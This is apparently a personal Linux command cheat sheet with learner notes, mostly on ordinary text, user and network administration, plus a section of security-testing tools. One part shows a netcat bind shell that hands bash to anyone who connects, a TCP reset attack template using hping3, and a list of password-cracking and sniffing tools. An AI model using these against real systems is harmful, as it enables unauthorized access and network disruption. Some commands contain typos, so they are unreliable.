# to search for a spacific words or letters in a file and print it out ( <a href="https://linuxtechlab.com/bash-scripting-learn-use-regex-basics/"> grip</a> )
```bash
grip 
```

# to edit a file without open the file 
```bash
sed # stream editor

sed ' s/ <the words you want to change from the file> / <the words you will put it instead of the last words> /' <the file name>

#for example

echo "hello there it's a great day" | sed 's/day/night/'
# this will remove the day word and replace it with a night word 
# the result : hello there it's a great night 

# second example 
echo "the first day, and the last day" | sed 's/day/night/g'
# the 'g' in the last, is used when u want to remove all the word you choose and replace it.

#note ::

#in the last case , the output just only will be different , but the actual text in the file won't be change .
```

# to spliting the contant of a file , into many files ; depending of the number of lines you choose , or actualy any thing u want 
```bash
split 

#for example 

for i in {1..100}; do echo $i >> file.txt ;done  
#this will create a file called file.txt , and then will put into it numbers for 1 to 100 , and every number in a single line ..

split -l 50 file.txt new_
#and this will split every 50 lines and put it in the new_ file .
```

# other commands (search for it):
```bash
cut
awk 
# example for awk

echo "line1, line2 \n col1, col2" | awk '{print $1}'
# this will print the first col only which contain : line1, col1, 
```


# to make you monitor the file and any log will the target do in the server
```bash

sudo tail -f var/log/apache2/acces.log

```


# netcut ..
## how to make a connection between a host and server , simple chat.

```bash
 waiting for the connection :: nc -l -n -v -p 4445
 making the connection :: nc (the other device ip) 4445
```

## how to shere files from machine to another

```bash

 the listner and the sender :: nc -lnvp 4445 < text.txt
 the host and the acceptaple for the file :: nc 192.168.1.5 -nv 4445 > text3.txt
 
```

## how to run an exe file when client is connect to you

```bash 

the listener :: nc -lnvp 4445 -e /bin/bash 
#(means that when he connect to ur device , your bash will run with hem and he can do whatever he want .)

the host and the hacker "let's say" :: nc 192.168.1.5 4445 -nv 

```

<p> <b> search also for socat </b> </p>


# shasum 

for achieving the integrity :: (hash)
```bash
shasum <the file name>
```


## to get the number of lines in a text file ::

```bash
cat <the file name> | wc -l
# or
cat -n <the file name> 
```

## to remove new lines from text file 

```bash
tr -d "\n"
```

## to delete empty lines from text file 

```bash
sed  '/^$/d' <text file>
# when u put -i , then it mean to modify the basix file not just to print the chamges 
```


## some basic tools for brute force attack ( cracking the password )

```bash
1- hashcat
2- hydra
3- crunch ( for making the possible passwords you can get )
```

## to find the location for a spacific folder 

```bash
locate <folder name> 
# or
which <file name> ## but this for the commands , it shows u where is the file of the command 
```

## to see or "watch" the difference happends to spacific job 

```bash
watch -d -n 0.5 <the job>
# -d just highlight the diffenece happending 
#and -n , choose which time will the page refreshe to show up the new changes 
```

## to overwrite a file or delete it for ever , can't be recoverd :: 

```bash
shred <file name> # see the manual page
```

## to transfer files from host to another over a network , and secure connection 

```bash 
scp <file name/s> username@hostname <the bath it will transfer to in other location>
```


# less , more and most commands ; search for it .
there are just like cat in purpose , but they differente with the way they do .
<a href="https://www.youtube.com/watch?v=JskCuaClsF8">more and less simple video</a>
<a href="https://www.youtube.com/watch?v=06GsFVeuWNk">another good video</a>

## to print the IP add for spacific host name or the reverse , with other things 

```bash
host -t A <host name> # forward lookup
host -t PTR <host name> # reverse lookup
```
## for searching or using the SMB ( server message block ; port : 139 ) and NetBIOS (network basic input output stream , port : 139 ) enumertion ( tools to use ) .. 
```bash
smbclient
smbmap
nbtscan

" Nmap SMB NSE script " < some scripts that will help u in the scan > 
< in the path /usrs/share/nmap/scripts/smb >


```

## other tools for enumeration 
```bash
enum4linux
smtp-user-enum
```


## to create a Harden and symbolix link 
```bash
ln <source file> <dis file> # harden link (carry a real data)
ln -s <src file> <dis file> # symbolix link (just a refrense to the actual file )
```


## to list the privilages of spacific user 
```bash
sudo -l
```
# users and groups

## at the first, important link and useful <a href="https://devconnected.com/how-to-list-users-and-groups-on-linux/">here</a>

## also useful link for removing and adding users to group <a href="https://linoxide.com/remove-linux-user-from-group/">here</a>

## to add user to group 
```bash
usermod -a -G <the group name> <the user>
```
## to list all the user names or the groups, <a href="https://www.unixtutorial.org/commands/getent">getent</a>, or check also the link <a href="https://phoenixnap.com/kb/how-to-list-users-linux">here</a>
```bash
getent passwd # this list all the usernames with it's details
getent groups # list all the groups with details also
getent passwd {1000..3000} # list all the normal users according to the UID (username id ).
```

# to see the processes which are running , like open the control panel in windows 
```bash
top 
ps 
ps -ef 
```

## to save the changes you have made to the system like in example the bashrc file ::
```bash
source ./.bashrc # instead of reboot the terminal or the system.
```
## to add new variable to the system or make a shourtcut for spacific application ::
```bash
# first name the file 
# mynewprog.py for example , and this prog is in the Desktop Directory 
# so now go to the .bashrc file

_QMX_@192:~$ subl .bashrc
# then in the last lines , write this :
export mynewprog=~/Desktop 
export PATH=$PATH:$mynewprog

# then after this , you have just to write the name of the program and it will auto run
mynewprog.py
```

## to show the disk space 
```bash
df
```

# to see the boot messages
```bash
dmesg # the path of the stored buffer is /var/log/dmesg 
```

# to change the ip address with ifconfig
```bash
sudo ifconfig wlan0 <the ip u want> #for example if you want it 1920168.1.20 
# and also you can change the broadcast and the netmask

# but note that it will cut the network !!!
```

# to add a getway to your nerwork
```bash
sudo route add default gw <the getway address>
```

# to change the login shell for a user
```bash
chsh
```

# to print a message for all the user on the system
```bash
wall
```

# to open or close ports (and many other things)
```bash
ufw allow 23/tcp  # port 23 tcp for example
# try the man command to know more about this command.
```

# Some Important files 
```bash
/etc/resolve.conf
/etc/hostsxx
/etc/shadow # all the encrypted password
/etc/nsswitch.conf # tell the OS where to go to fetch information it needs
/etc/rsyslog.conf # and check also the /etc/rsyslog.d directory
/etc/*issue
/etc/*release

/usr/share/exploitdb # the exploits which apear in the results of searchsploit tool
/usr/share/nmap/scripts # some exploits for a vuln.
/usr/share/wordlist # contains a list of word that may help you in brute force attack

/var/www/html # if you want to make a webpage on your ip
/var/log # direcotory
|
|---/var/log/apache2/access.log # log file for the apache web server
|
|---/var/log/mysql/mysql_error.log
|
|---/var/log/mysql/mysql.log # when the web serves entered to take the data from the DB.
|
|---/var/log/mysql/mysql-slow.log 
|
|---/var/log/slapd # for the LDAP
```

# trace the network traffic ( some basic tools ) : 
```bash
tcpdump
wireshark
```

# to list the open file in the system
```bash
lsof # see the man page or the video ( https://drive.google.com/drive/folders/1x4lbPxqJxXVjbynW4pse6ntgQRfJlOgU ) video 9.21
```
# sending the log files, search more for it
```bash
logger
```

# to print any info about the system 
```bash
uname
```

# for scanning a web page tool
```bash
dirb
nikto
```

#  searching for and exploit 
```bash
searchexploit
```

# to find your public ip from terminal, check <a href="https://tecadmin.net/5-commands-to-get-public-ip-using-linux-terminal/">here</a>
```bash
dig +short myip.opendns.com @resolver1.opendns.com
curl ifconfig.me
```

# to run acommand ina different enviroment 
```bash
env
```

# to combine passwd and shadow files, ''before cracking with john the ripper''
```bash
unshadow
```

# image viewer 
```bash
eog
```

# to open the Cloudflare’s Warp vpn 
```bash
sudo wg-quick down wgcf-profile
sudo wg-quick up wgcf-profile
systemctl start systemd-resolved.service # the service has to be open
```

# for tcp reset attack
```bash
hping3 [des ip] -s [src port] -p [des port] -A "to send ack " -R "to send reset flag" -M [seq num "not relative"] -L [ack num "not relative"] -c [num of reset flags you want to sent "usualy 1"]
# you may use also -F to send finish tcp flag instead of reset flag
# can do also many other things , see the man page

yersinia # big important tool for network attacking things
```

# other sniffing tools
```bash
dsniff
ettercap
kismet
snort
```

# to configure a 'wireless' network adaptor
```bash
iwconfig

ifconfig # to conigure a network adaptor in general 
```